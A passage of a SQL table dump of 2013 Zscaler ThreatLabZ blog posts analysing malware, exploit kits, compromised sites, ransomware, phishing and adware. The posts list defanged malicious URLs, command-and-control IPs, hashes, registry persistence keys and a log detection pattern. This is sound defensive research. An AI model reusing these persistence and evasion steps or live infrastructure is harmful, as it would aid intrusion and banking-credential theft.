every instance, so its no wonder standard AV is having a problem keeping up (1/46 at time of research). This AV performance also indicates that the likelihood of someone proactively catching this infection inside their network is fairly low at the time of this writing.    Use of DGA       A domain generation algorithm (or DGA) represents an algorithm seen in various families of malware to generate a large number of quasi-random domain names.  These can be used to identify the malware\'s command and control (CnC) servers so that the infected hosts can \"dial home\" and receive/send commands/data. The large number of potential rendezvous points with randomized names makes it extremely difficult for investigators and law enforcement agencies to identify and \"take down\" the CnC infrastructure. Furthermore, by using encryption, it adds another layer of difficulty to the process of identifying and targeting the command and control assets.        What initially drew us to this threat was the use of DGA following the execution of the dropped malicious package. We ran three test instances of the attack sequence in our Behavior Analysis (BA) lab to illustrate the use of DGA in the malware\'s attack sequence:         Instance 1    cso0vm2q6g86owao.thepohzi.su    5qloxxe.tohk5ja.cc    k2s0euuz.oogagh.su         Instance 2    v8ylm8e.thepohzi.su    2g24ar4vu8ay6.tohk5ja.cc    d6vh5x1cic1yyz1i.oogagh.su         Instance 3    t2250p29079m6oq8.thepohzi.su     ngb0ef99.tohk5ja.cc        nxdhetohak91794.oogagh.su         The pattern (\"ping.html?r=\") is commonly known to be used by past versions of Caphaw.  Don\'t panic straight away if you see this string in your user logs however as it is also commonplace among sites that use \"outbrain.com\" services.  You\'ll want to look for any URI path that uses /ping.html?r= that does not contain \"/utils/\".  Hopefully that helps narrow the search to see if you\'ve encountered transactions similar to the following screenshot.      	  		  			  		  		  			DGA is used to hide the phone home activity of the initial detection  		  	      Across all 64 distinct samples we\'ve collected of this threat thus far, there have been 469 distinct IPs where there has been a call to a DGA location.  A small sample of those illustrate the connection between the phone home data collected via network logs and the BA of the Caphaw samples.                	  		  			  		  		  			The DGA used here shows a connection between Caphaw phone home activity and Sandboxed samples of the threat in question  		  	      Use of SSL encrypted communications        The initial indicators were in the form of mysterious self-signed SSL traffic between end user hosts and various points of presence on the Internet, potentially components of the malware’s CnC infrastructure.  See the screenshot below showing the self signed SSL cert. used in the malware communication:      Other screenshots below show the SSL handshake between the infected hosts and the remote CnC servers:           	  		  			  		  		  			SSL communication between infected host(s) and the remote CnC servers  		  	          A binary executable (.exe) file is created in the attack sequence and masquerades as a .php file. This executable is created using Microsoft Visual C++ and the creator has not removed the debugging information from the final executable.        Both the location of where this file is dropped and the name of the file itself is selected quasi-randomly. For example, in one of the test instances we found this to be:       C: Documents and Settings\\user\\ApplicationData\\Sun\\Java\\Deployment\\SystemCache\\6.0\\9\\typeperf.exe             During the three instances of malware execution we ran in our BA lab, we observed the following executables and their drop locations:       \\Documents  and  Settings\\%USER%\\ApplicationData\\Sun\\Java\\utilman.exe    \\Documents  and  Settings\\%USER%\\ApplicationData\\Microsoft\\Proof\\eventtriggers.exe    \\Documents  and  Settings\\%USER%\\ApplicationData\\Microsoft\\Office\\cliconfg.exe              The malware makes the following significant API calls:       	LoadLibrary  	GetProcAddress  	Virtualalloc                 The  malware executable checks to see if it is running in a VM environment and also ensures that the host on which it is installed is connected to the Internet (failing which it will not run).         The malware also exhibits persistence by creating the following autorun entry in the registry:           HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run    dfrgntfs.exe      Unicode     C:\\Documents and Settings\\user\\Application Data\\Sun\\Java\\Deployment\\SystemCache\\6.0\\9\\typeperf.exe*  success or wait   1     B8EF5F      RegSetValueExA         Further, the executable when run, modifies the explorer.exe process to ensure that it\'s self-signed certificates are not cached and it also hides inside the explorer.exe process to ensure that the protection banner is hidden for a stealthier execution:          HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3      2500  dword 3     success or wait   1      DAEF5F      RegSetValueExA         HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings  DisableCachingOfSSLPages      dword 1     success or wait  1     DAEF5F      RegSetValueExA         HKEY_USERS\\Software\\Microsoft\\Internet Explorer\\Main  NoProtectedModeBanner   dword 1     success or wait   1     DAEF5F      RegSetValueExA         The malware then augments system processes to hinder its removal, once again for persistence:          328   C:\\WINDOWS\\system32\\wscntfy.exe     B30000      344064         success or wait   1      DA8FB2      WriteProcessMemory       1612     164   7C8106E9    DC5A7B      C:\\WINDOWS\\explorer.exe success or wait   1     CC004D      CreateThread        	  		  			   		  		  			   		  	      Scope of the threat and impact    Further evidence of this being Caphaw exists in the banking information that it is listening for once it is injected into key Windows Processes.  Amongst all samples analyzed, we found the following 24 major banks\' sites were actively being monitored by the infection primarily to seek out the victim\'s online banking credentials. This is based on data pulled from an added thread to explorer.exe process.      	Bank of Scotland  	Barclays Bank  	First Direct  	Santander Direkt Bank AG  	First Citizens Bank  	Bank of America  	Bank of the West  	Sovereign Bank  	Co-operative Bank  	Capital One Financial Corporation  	Chase Manhattan Corporation  	Citi Private Bank  	Comerica Bank  	E*Trade Financial  	Harris Bank  	Intesa Sanpaolo  	Regions Bank  	SunTrust  	Bank of Ireland Group Treasury  	U.S. Bancorp  	Banco Mercantil, S.A.  	Varazdinska Banka  	Wintrust Financial Corporation  	Wells Fargo Bank          	  		  			  		  		  			Strings found in explorer thread added by Capchaw  		  	        ThreatLabZ continues to monitor the Internet for this threat and it\'s propagation. The lab is also engaged currently in dissecting this threat further in order to obtain more information about its attack methodology, scope and impact.     Written by Sachin Deodhar & Chris Mannon (ThreatLabZ)', 'Malware', 'https://www.zscaler.com/blogs/research/new-wave-win32caphaw-attacks-threatlabz-analysis');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (221, 'Bangalore Metro Rail Site \"bmrc.co.in\" Compromised', 'ThreatLabz', 'September 18, 2013', 'Bangalore\'s Metro Rail project website (Bangalore Metro Rail Corporation Limited), \"bmrc.co.in\" is compromised. Malicious obfuscated JavaScript has been injected into several pages. The obfuscated code contains an iFrame, which after execution, redirects users to a malicious website. This is typical behavior for a JavaScript Trojan. More information about this particular Trojan can be found in McAfee\'s description of threat JS/Exploit-Blacole.em.  Lets look at some of the details of this particular infection.    Compromised Pages:  We have seen more than one page on this website that were found to be compromised. All of the compromised pages are infected with the same malicious JavaScript code.       hxxp://bmrc.co.in     hxxp://bmrc.co.in/careers.htm      hxxp://bmrc.co.in/Network.htm     Malicious Code:  The injected code is obfuscated JavaScript as seen below.                   The obfuscated JS is enclosed in \"<!--2d3965-->\" and \"<!--/2d3965-->\" tags.       De-obfuscated Code:  De-obfuscation of the aforementioned JavaScript reveals the browser redirection process.    Cookie checking:  De-obfuscated JS checks a cookie value to determine if the page was loaded in the browser previously. If the code is being loaded for the first time, it then creates a cookie called \"visited_uq\" which is set with a value of \"55\" for one day with a path of \'/\'. It then calls function which creates an iFrame.                   iFrame Redirection    The following code performs an iFrame redirection to \"hxxp://ecurie80.hostzi.com/Felenne12/clik.php\"           Network Trace           VT Report for \"bmrc.co.in/careers.htm\":  URL Scan: 8/39  File Scan: 18/47     At the moment, the redirection is no longer serving malicious code. The page ultimately resides at a free hosting service (000webhost.com) but appears to have been taken down. The page could however be revived at some point and the original vulnerability which led to the infection may still exist, so users are advised to avoid the BMRC website until this issue has been addressed. ThreatLabZ has informed BMRC about this infection.      Pradeep', 'Compromise', 'https://www.zscaler.com/blogs/research/bangalore-metro-rail-site-bmrccoin-compromised');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (222, 'Ransomware Posing As FBI', 'Chris Mannon', 'September 13, 2013', 'Update:  The Talent over at MalwareDon\'tNeedCoffee has a very thorough analysis of this malware.    Scammers and Spammers are always looking to cash in on recent news whether it be twerking or a royal baby.  I know it may seem like we are inundating you with ransomware threats this week.  The international climate has shifted towards privacy concerns due to PRISM leaks and malware writers have taken note.  This week we discussed how Fake NSA alerts tried to shake down users for a $300 to avoid prosecution.  This week a fake FBI posting purports to be after pornographic material that is displayed within the popup message (blacked out).       	  		  			  		  		  			Don\'t Panic.  		  	    This isn\'t the only intimidation tactic employed by the Trojan.  It also disables access to Task Manager and other Windows tools to limit the user\'s ability to close the disturbing page which is actually hosted on the victim\'s PC found at the following location:       C:\\Documents and Settings\\user\\Local Settings\\Application Data\\(8 Character string)\\index.html    It disables the user\'s ability escape the message by hooking the process to Winlogon via the userint.exe process and creating an Autostarter value.    	  		  			  		  		  			Userinit.exe Augmented  		  	           	  		  			  		  		  			Autostarter Value Set  		  	      The final aspect of this threat is that it is constantly posting content from the victim\'s PC to contribute to a botnet.       	  		  			  		  		  			This POST is seen every 5 seconds.  		  	    I suspect that this trend of giving fake Government alerts to propagate malicious content is only going to trend upwards.  Some download locations for this threat can be seen here:      	hxxp://www.techmediastream.com/misc/adobe_flash.exe  	hxxp://originalfutures.com/images/fest/adobe_flash.exe  	hxxp://somebizarre.com/img/33/adobe_flash.exe    The phone home activity for this threat is based Germany, not the US.      	91.109.21.7:1087-1096', 'Ransomware', 'https://www.zscaler.com/blogs/research/ransomware-posing-fbi');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (223, 'Fake AV And PRISM Warning On Hijacked Website', 'Julien Sobrier', 'September 09, 2013', 'While many individuals are concerned about privacy in light of PRISM, some malicious actors are using the program to scare naive users into installing ransomware. Since August 23rd, we have seen about 20 domains that carry FakeAV and Ransomware. These websites seem to have been hijacked. They are all hosting the malicious content over port 972 and use similar URL patterns. Here are a couple examples:      	kringpad.websiteanddomainauctions.com:972/lesser-assess_away-van.txt?e=20  	miesurheilijaaantidiabetic.conferencesiq.com:972/realism_relinquish-umbrella-gasp.txt?e=21  	squamipi.worldcupbasketball.net:972/duty_therefore.txt?e=21      The malicious files seem to be changing. It started with the classic FakeAV, then switched to a fake PRISM warning. In both cases, the goal is to scare the target into paying the attacker to \"fix\" their computer.       FakeAV    FakeAV remains a popular technique to lure targets into paying attackers. Most of the instances of FakeAV we have reported earlier were running a fake computer scan in the browser. This time it appeared as a Desktop application.                   	  		  			  		  		  			FakeAV scan of the computer  		  	             	  		  			  		  		  			FakeAV claims to have found threats  		  	      The scan claims to have found 18 threats. Two have been cured, but the victim must pay to get the remaining 16 threats taken care of.         	  		  			  		  		  			Some of the malicious behaviors of this FakeAV variant  		  	           PRISM warning    The other malware is interesting. The attacker uses the recent news about PRISM to claim that the victim\'s computer has been blocked because it accessed illegal pornographic content. The victim has to pay $300 through MoneyPak, a prepaid card service.                     	  		  			  		  		  			No less than 5 federal agencies are \"blocking\" your computer!  		  	                       	  		  			  		  		  			Victim needs to pay up $300 to get his computer back.  		  	        Both malware connect to the same couple of IP addresses over ports 80 and 443 that include:           	37.139.53.199  	64.120.167.162  	64.191.122.10      I expect attackers to take advantages of the upcoming UK laws on accessing adult content online to send new types of fake warnings to UK victims.', 'Malware', 'https://www.zscaler.com/blogs/research/fake-av-and-prism-warning-hijacked-website');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (224, 'Kelihos Botnet: What Victims Can Expect', 'Chris Mannon', 'August 27, 2013', 'There is has been a recent surge in security blogs warning users to be extra cautious of a new spin on an old threat.  Kelihos is a botnet which utilizes P2P communication to maintain its CnC Network.  With all of the attention around Kelihos, it should be no surprise that 30/45 AV vendors are detecting the latest installer.  I took some time to analyze recent threat reports that came through our malicious/suspicious files queue, to see if I could find anything to add.  It didn\'t take long to find a now infamous iteration of this botnet installer in action.  In particular, I found a file called \"rasta01.exe\".    Besides the common naming convention of this threat, there are many other factors which gave this infection away at a glance.  Firstly, the use of P2P style communication via SMTP raised an eyebrow.  This particular instance called out to 159 distinct IP addresses.         	  		  			  		  		  			A small portion of the SMTP calls made from a standard instance of Kelihos  		  	        Secondly, we observed the overt way the botnet installs several packet capturing utilities and services.  This is done so that the infection can monitor ports 21, 25, and 110 for username and password information.       	  		  			  		  		  			Everything you need to monitor packets is created/dropped here.  		  	      Next, I noticed that the botnet attempts to categorize it\'s new victim by using legitimate services to gather intelligence.  In this instance, the malicious file actually queried the victim IP address on Barracuda Networks, SpamHaus, Mail-Abuse, and Sophos.  These services primarily exist to notify users of abuse seen on the site or IP address.  Kelihos is using it to to determine if the new victim is already seen as malicious or not.  If the victim isn\'t seen in the CBLs (Composite Block Lists) yet, then it may be used as either a Proxy C&C or Spam-bot.       	  		  			  		  		  			References to CBL\'s from each location will determine what role the victim plays in the botnet.  		  	        A final point to make about this threat is that it makes no attempt to hide exactly how loud it is regarding network activity.  We noted a spike in TCP traffic across a distinct 563 IP addresses in the span of two minutes.  Network administrators should take extra care in monitoring users with anomalous levels of traffic.  A single node giving off so much traffic to different services in such a small window could be used to identify potential victims.', 'Malware', 'https://www.zscaler.com/blogs/research/kelihos-botnet-what-victims-can-expect');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (225, 'Expack Continues Exploiting Java Vulnerability', 'ThreatLabz', 'August 26, 2013', 'Exploit kits available in the wild tend to follow a trend by exploiting vulnerabilities reported in various browser components which are commonly deployed. Recently, we have seen an increase in exploitation of a year old vulnerability reported in the JRE component of JAVA (CVE-2012-1723). Exploitation of this vulnerability in JRE allows a attacker to download malware onto a victim\'s machine and execute it. Let\'s looks at an analysis of such an exploit kit recently found in the wild.       Exploit Kit URL:    hxxp://174.142.240.91/577ac477f62d4873cf41dc834d107b7c/influences-portal.php         When accessed, the above exploit URL executes obfuscated JavaScript and loads an applet into the browser as shown below:                Obfuscated source code:                  Let\'s analyze the above obfuscated JavaScript code by de-obfuscating it. While de-obfuscating the JavaScript code, we noticed that the code has multiple layers of obfuscation. For the scope of this article, lets skip ahead to the end of the de-obfuscation process.          As usual, the exploit kit request loads content based on the version of the browser and versions of different plugins installed in a browser by running browser/plugin detection logic embedded in obfuscated JavaScript. The exploit kit targets vulnerabilities in JRE (Java) and Adobe components of the browsers.         Let\'s take a look at following de-obfuscated code which loads malicious applet into browser:                  The following code calls the relevant functions above, depending upon the JRE version found on the victim\'s machine:               The applet is executed by the browser, which then downloads a malicious .jar file from following URL,         hxxp://174.142.240.91/577ac477f62d4873cf41dc834d107b7c/influences-portal.php?gKoRO=UfhqAFb&gCTEVgSTdQbZjI=wUkSXV          The de-complied code of the downloaded .jar file is also heavily obfuscated.                   VT Result: 13 / 45    MD5:  361b0e1eab5e647315e6873ea16ca720       This .jar files exploits the vulnerability in the JRE, which allows the attacker to download additional malware and execute it the browser context.                   VT Result: 13 / 46     MD5: a151fdce265ba4fcab1b36bd624d330f       A Trojan then connects to the CnC server by sending POST data and in response, the CnC server replies with \'STATUS-IMPORT-OK\'.              After receiving command \'STATUS-IMPORT-OK\' from the CnC server, The Trojan then downloads another malware file (6.exe) from the same domain which looks to be a variant of ZerooAccess rootkit. The detection rate for the \'6.exe\' is also fairly low on VT.                                   VT-Result: 6 / 46      MD5: b152b3d170dc089b057fbbe3d6393764         Exploitation of browser components such as Java and Adobe plugins by exploit kits are now a very common reason for enterprise PCs to become compromised. My colleague Krishanan Subramanian recently blogged about a rise in Red Kit Exploit Kit Activity, which also addressed the same vulnerability in Java. It is vital that enterprises ensure that browser plugins are always patched and up to date, something enterprises regularly fail to do. In the case Java, given the now regular stream of 0days that it has inspired, you may want to seriously consider disabling Java altogether, at least at the browser level, something that you can read about in a previous blog post entitled: Are you vulnerable to yet another Java 0Day exploit?         Pradeep', 'Analysis;Exploit Kit;Vulnerability', 'https://www.zscaler.com/blogs/research/expack-continues-exploiting-java-vulnerability');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (226, 'Malicious .jar Files Hosted On Google Code', 'ThreatLabz', 'August 17, 2013', 'Recently we blogged about Google Code hosting malware. Within a month we have observed a second instance where malicious .jar files are being hosted on Google Code. Using Google code to distribute malware seems to increasing in popularity, no doubt due not only to the free hosting provided, but also the positive reputation of the google.com domain. This indicates that there is presently inadequate validation performed by Google prior to content being uploaded to the Google Code site. In this case, a simple anti-virus scan would have found following pieces of malware.         Google Code URLs:     hxxp://update-java.googlecode.com/    hxxps://code.google.com/p/update-java/         Hosted Files:           Both files \'update.jar\' and \'Client.jar\' have an MD5 of \'0521c911e442cd9eec927d8439731a76\' and a size of \'3,626\' bytes.     VirusTotal Result:    URL Scan: 7 / 38 detections    File Scan: 28/45 detections         ZULU Result: 100/100 score  ZULU rules which are flagging .jar files as malicious.                  The two projects are hosted on \'code.google.com\' by the same uploader who has an email ID of \'daicadad...@gmail.com\'. The second project is also currently live (hosted at \"hxxp://code.google.com/p/update-java-download/\") and contains the same \'Client.jar\' file. You will note that other links within the projects like \'Project Home, \'Wiki\', \'Issues\', etc. contain minimal information about the project, suggesting that malware hosting was the only goal.           Malicious piece of Java code in \'Client.jar\' file:           This .jar file basically takes a URL as input and downloads a file from the given URL. The same type of .jar file was previously analyzed and mentioned in an earlier Zscaler blog.         The release date on the \'Download\' link indicates Apr 26, 2013, but we have observed in the Zscaler logs, the same file being hosted on \"hxxp://heckraiser.fileave.com/youtube/YouTube.jar\" as far back as July 24, 2011.      In the past, we have seen sites like Dropbox, Google Code and other free hosting providers being leveraged to deliver malware. Free hosting providers, especially those with a positive reputation are becoming popular for attackers to serve malicious content. Enterprises and end users alike, should consider any third party content, regardless of location, to be untrusted until it has been appropriately scanned.      Pradeep', 'Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/malicious-jar-files-hosted-google-code');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (227, 'Anatomy Of An Ongoing Drive-by-Download Campaign', 'ThreatLabz', 'August 16, 2013', 'While doing a weekly review of our logs, we stumbled upon thousands of transactions that seem to be a part of an ongoing malware campaign. We found compromised websites that redirect the browser to an exploit kit, further leading to a drive-by-download dropper. The source was traced to originate from blackhat SEO redirections (yandex[.]ru).          The attack can be dissected into two stages, an injected malicious script which redirects to a domain and a second stage in which the domain sends the browser through an HTTP 302 redirect that finally leads to the landing page. The 302 redirection domains resolved to an IP range 192[.]133[.]137[.]0/24. The landing page domains were having a very low TTL and were hosted in sub-net 109[.]236[.]80[.]0/24 (AS49981). The server is hosted in NL. The campaign leveraged a DGA (Domain Generation Algorithm) along with Dynamic DNS to deliver the payload and the domains which delivered the exploit were ending with a [.info] TLD. The following snapshot shows some of the sample redirection and dynamically generated landing page domains.                                                                                             The mechanism of the attack is as follows. Firstly, a malicious redirection script is injected into the webpage:                                                                                                                                                                                                                     This is followed by a 302 redirect, which then leads to the exploit kit landing page.                                         The exploit kit favors the g01pack, which delivers a multistage exploit. Initially, it detects the browser plugins and versions thereof and then serves the exploits accordingly. At the time of analysis, I was using Java v1.6 release 26. The landing page was as follows:                                   As seen, the landing page also tries to deliver a Flash exploit. Unfortunately, at the time of analysis I was getting a 404 response for the SWF payload.                  The applet is loaded with the \"applet_ssv_validated\" passed as an undocumented parameter to the applet, which allows the attacker to carry out a JVM security bypass. The applet then makes the call to the malicious JAR file.                       The JAR file tries to exploit CVE-2012-0507 and drops the malicious executable. The snapshot summaries the code which carries this out.  Only two anti-virus vendors detected this JAR file as seen in this VirusTotal Report.                              The dropped EXE files are Ransomware/Fake AV/ZeroAccess Trojans, depending upon the payload delivered. Our Behavioral Analysis Engine flagged these files as malicious and the VirusTotal Report shows that 10/46 Anti-virus vendors detected this at the time of analysis. Also shown are some screen shots of the Ransomware/Fake AV after successful infection.                         Given it\'s rocky history with security, there has and will always be some buzz about new exploits against Java Plugins. Attackers will continue to own browsers as long as the Plugin is enabled and vulnerable. Refer to this post to learn how to stay protected from exploit kits. Wishing you happy & safe browsing !', 'Exploit Kit;Malware', 'https://www.zscaler.com/blogs/research/anatomy-ongoing-drive-download-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (228, 'CookieBomb Still Dropping Malicious Content', 'Chris Mannon', 'August 15, 2013', 'Cookiebomb is malicious obfuscated javascript injected into legitmate sites.  We\'ve talked on this blog about compromised sites before, but this one appears to still be fully functional and actively spreading malicious content to unsuspecting users.  The talent at MalwareMustDie is onto their shenanigans as well.  As they have mentioned, this is a multi-redirection exploitation that uses two stage obfuscation to hide it\'s malicious payload.  The curious thing about this situation is that few AV vendors have taken note of the good research.  The final dropped file is being detected by only 7/45 vendors.    Below is the analysis of a single sample taken from the final list of infected sites we have seen propagating this threat.    First, there is the obfuscation of a small JS inclusion into a potentially legitimate site.  This is where the CookieBomb sets a name, special variable, expiry date, and access path for the eventual infection.  If the cookie is not readily available, it will create one for you and redirect you to another obfuscated hidden iFrame.  Once the hidden site is visited, it will read the cookie\'s expiry date and provide redirection and infection at a later point to avoid security vendor detection.         	  		  			  		  		  			Figure 1: Obfuscated Code  		  	      Please note that the comment at the top of the image (\"/*0f24908*/\") is changed and is not therefore useful for detection.      	  		  			  		  		  			Figure 2: De-obfuscated code from Fig.1  		  	        In the deobfuscated code above, we see another URL delivered in a 1px iFrame.  Going to this site leads to yet another obfuscated page, where the real magic happens.  The very first thing that it does is attempt to confirm the version of browser plug-ins the attackers are up against.                     	  		  			  		  		  			Depending on the version installed, it will send the next portion of the attack.  			   		  	           The final step sends the malicious payload that the attackers went to so much trouble to obfuscate.                                                  	  		  			  		  		  			Attack URLs  		  	                                 	  		  			  		  		  			Obfuscated content from the obfuscated content  		  	        The final drop for this content is a malicious executable that is delivering a small Trojan.  At the time of research, only 7/45 vendors were detecting this content as malicious.                                    	  		  			  		  		  			Fiddler session with malicious content being dropped.  (Readme.exe in this case.  Calc.exe in others.)  		  	           For the last several weeks, this attack has impacted the below sites:                                            	 hxxp://www.citytavern.com/  	hxxp://www.usadu.cz/park-en/  	hxxp://bluen.de/jobborse/  	hxxp://bluen.de/  	hxxp://www.niblackfuneralhome.com/  	hxxp://www.kinwindsor.com/  	hxxp://www.mtldesign.net/  	hxxp://javiervazquez.me/ernesto/fdjw3hv7.php  	hxxp://www.cmfurniturerental.com/  	hxxp://sdrs.splashtop.com/strs01/macupdatenotes/en-us/strs01.html  	hxxp://www.nauticodiver.de/tauchbas.htm  	hxxp://www.tmv-alsace-vtt.com/f/parcours.htm  	hxxp://www.cmstaging.com/  	hxxp://educationdegreeonlines.com/benefit-from-studying-with-the-laptop/  	hxxp://www.gute-reise-berlin.de/aussteller.html  	hxxp://lexespana.com/comunes                                                                                                            	hxxp://livehappylife.com/  	hxxp://corpdeli.com/  	hxxp://www.sudan-sudan.com/sudan/architecture-sudan-sudan.html  	hxxp://www.cmfurniturerental.com/index.php?main_page=index&cPath=114&zenid=8557f58ea51118a7bd633015e3b954ec  	hxxp://www.cherokeecountysc.com/id26.html  	hxxp://www.gute-reise-berlin.de/startseite.html  	hxxp://www.selbstversuch-spanien.de/  	hxxp://educationdegreeonlines.com/  	hxxp://www.nauticodiver.de/schule.htm  	hxxp://bluen.de/uber-uns/  	hxxp://www.nauticodiver.de/impresssum.htm  	hxxp://www.imschuh.de/  	hxxp://www.nauticodiver.de/preisliste.htm  	hxxp://familyreunion.blackamericaweb.com/  	hxxp://bluen.de/jobborse/spezialist-in-akustikversuch/  	hxxp://www.uppertraining.com/blog/cisco-mobile-apps-cover-a-surprising-range-of-functionality/  	hxxp://www.opheij.nl/contact.html  	hxxp://www.hotelmirallac.com/castellano/tarifas.htm  	hxxp://www.sugargrovechamber.org/member_listing/34/curt+john+karas,+cpa,+mba,+pc/  	hxxp://www.kinwindsor.com/favicon.ico  	hxxp://glassdoctor-denver.calls.net/?gclid=CPLt2r3F-LgCFUFyQgodZxwAjQ  	hxxp://bluen.de/jobborse/spezialist-in-logistikplanung/  	hxxp://dreamliftgifts.com/faq.html  	hxxp://www.gute-reise-berlin.de/kontakt.html  	hxxp://www.plomberiumpierrefonds.ca/robinets-de-cuisine/  	hxxp://www.cerexagri.nl/  	hxxp://www.mrbouncehouse.com/  	hxxp://guia.lexespana.com/familia/servicio-domestico/extincion-del-contrato/  	hxxp://www.nauticodiver.de/start.htm  	hxxp://corpdeli.com/lunch-menu  	hxxp://www.hotelmirallac.com/castellano/habitaciones.htm  	hxxp://www.nauticodiver.de/  	hxxp://www.heapoil.org  	hxxp://www.mtldesign.net/aboutus.htm  	hxxp://www.le-vieux-four.com/  	hxxp://www.cleargridsolutions.com/developer.html  	hxxp://www.horseridingfun.com/  	hxxp://educationdegreeonlines.com/2013/07/        The most notable site here is splashtop.com, however, the malicious content has since been removed.  Since AV seems to be uninterested in protecting against this threat, it is advisable to make sure your browsing is safe through other means.    Technical Research: Krishnan Subramanian', 'Analysis;Compromise;Exploit Kit;Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/cookiebomb-still-dropping-malicious-content');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (229, 'Facebook Phishing: Manual Session Hijacking', 'Julien Sobrier', 'August 14, 2013', 'We have reported a number of Facebook phishing pages and scams on this blog. Attackers always come up with clever ideas to fool users in order to obtain their credentials. One of these phishing tricks is a \"poor-man\" session hijacking attack whereby the user is fooled into copying and pasting a Facebook URL containing the session ID or other credentials into a malicious page. I\'ll describe such an example that I spotted this past weekend.    The phishing page starts with the usual bait, a video. This time, no sex, but instead an opportunity to watch \"Jackie Chan died after perfecting a deadly stunt. Jackie Chan falls from a building of 12 floors.\"       	  		  			  		  		  			Jackie Chan died!  		  	    The user must click to verify his age, another common trick to get users to click on the page. This displays a list of steps to \"verify your age\" which involve clicking on another link, copying a link from the window opened, and submitting the data.       	  		  			  		  		  			Steps to \"verify\" the user age  		  	    The new window points to Facebook. The window is too small for the user to understand what he is copying. Also, instead of opening a page, the URL used is \"view-source:https://www.facebook.com...\". This makes it one step harder for the user to understand that the window displays a page from Facebook.       	  		  			  		  		  			Popup window open by the phishing page  		  	    When the user copies and pastes their Facebook URL into the 3rd party web page, they\'re also sending their authentication token used share content. Once this is done, the scammer can now post content on the user\'s behalf.    Fortunately, Facebook reacted quickly to this particular scam. The Facebook  popup is not valid anymore and it shows the following warning:    	  		  			  		  		  			Warning from Facebook  		  	    When subsequently logging into Facebook after viewing the scam, I also received a warning about phishing pages:      	  		  			  		  		  			Warning about phishing pages  		  	      It looks like Facebook has reacted much faster than they have in the past and added additional warnings for end users. I was asked by Facebook to review my timeline for any suspicious activating just after I logged in. Hopefully more Facebook users will learn about these phishing techniques and will be able to spot them early on.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/facebook-phishing-manual-session-hijacking');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (230, 'Gap Between Google Play And AV Vendors On Adware Classification', 'Viral Gandhi', 'August 08, 2013', 'Two critical items impacting mobile use are privacy and a positive user experience. The mobile app market is built on trust. Questionable mobile advertising practices, such as apps employing deceptive adware practices, negatively impact the end user’s perception of both privacy and the user experience. Doing things like capturing personal information such as email addresses, device IDs, IMEIs, etc. without properly notifying users and modifying phone settings and desktops without consent, is annoying and unacceptable for mobile users. While the majority of mobile ads are not malicious, they are undesirable for most.       Zscaler regularly analyzes applications in the Google Play store to profile apps and identify those presenting security and privacy risks. By studying this data, we have come up with some interesting statistics concerning the prevalence of ‘adware’ in apps permitted into the Google Play store. We have tracked the top 300 applications in each category             We have found around 1,845 applications which are flagged by one or more AV vendors as  including adware. This is a big number. Most of the applications were flagged by AV vendors due to their excessive inclusion of ads and deceptive practices for delivering them, including altering device settings. For example, many AV vendors flag the Airpush API as adware. Despite this fact, there are many apps within the Google Play store that include this API. This illustrates the conflicting interests that Google and the AV vendors have. It is in the best interests of Google to appease advertising companies. Google wants to encourage developers to expand offerings in their app store and developers often profit from free apps through advertising. Paid apps may also include advertising, in which case, Google takes a direct cut from from the app proceeds. Therefore, Google has plenty of incentive to allow apps with aggressive advertising practices. AV vendors on the other hand have no such incentive but are instead under pressure to show that they are adding value by identifying malicious/suspicious/unwanted content. As such, there is a big gap between Google and AV vendors when it comes to adware. Ultimately, end users are stuck in the middle as they are left to decide if they will keep or delete the apps being flagged. Other adware commonly flagged by AV vendors includes leadbolt, airmob, plankton  etc.                     We have collected the following AV data for apps flagged as including adware leveraging VirusTotal:    ·         Number of apps flagged by fewer than 5 AV vendors: 354    ·         Number of apps flagged by 5 to 10 AV vendors: 854    ·         Number of apps flagged by 10 to 15 AV vendors: 381    ·         Number of apps flagged by more than 15 AV vendors: 34         This above chart shows adware percentage in each app store category       This above chart shows adware percentages in each game category.              We have only considered the top 300 applications in each category. As such, the statistics include the most popular applications in the Google Play store.         Below is an analysis of a single application flagged as adware on Google Play store :         Application: Windows Live Hotmail PUSH mail         Details     AV results: Flagged by 21 AV vendors         Zscaler static analysis:         Requested application permissions:     ·         android.permission.READ_SYNC_SETTINGS    ·         com.android.launcher.permission.UNINSTALL_SHORTCUT    ·         android.permission.USE_CREDENTIALS    ·         com.motorola.dlauncher.permission.READ_SETTINGS    ·         android.permission.ACCESS_COARSE_LOCATION  location    ·         com.motorola.dlauncher.permission.INSTALL_SHORTCUT    ·         android.permission.READ_SYNC_STATS    ·         android.permission.WRITE_SYNC_SETTINGS    ·         android.permission.INTERNET    ·         com.android.vending.BILLING    ·         com.lge.launcher.permission.INSTALL_SHORTCUT    ·         android.permission.SEND_SMS    ·         com.android.browser.permission.WRITE_HISTORY_BOOKMARKS    ·         com.android.launcher.permission.INSTALL_SHORTCUT    ·         com.clearhub.wl.permission.C2D_MESSAGE    ·         android.permission.WRITE_SMS    ·         android.permission.ACCESS_NETWORK_STATE    ·         com.android.browser.permission.READ_HISTORY_BOOKMARKS    ·         com.htc.launcher.permission.READ_SETTINGS    ·         android.permission.WRITE_EXTERNAL_STORAGE    ·         android.permission.ACCESS_FINE_LOCATION  location)    ·         android.permission.RECEIVE_BOOT_COMPLETED    ·         com.android.launcher.permission.READ_SETTINGS    ·         android.permission.CALL_PHONE    ·         android.permission.READ_PHONE_STATE    · 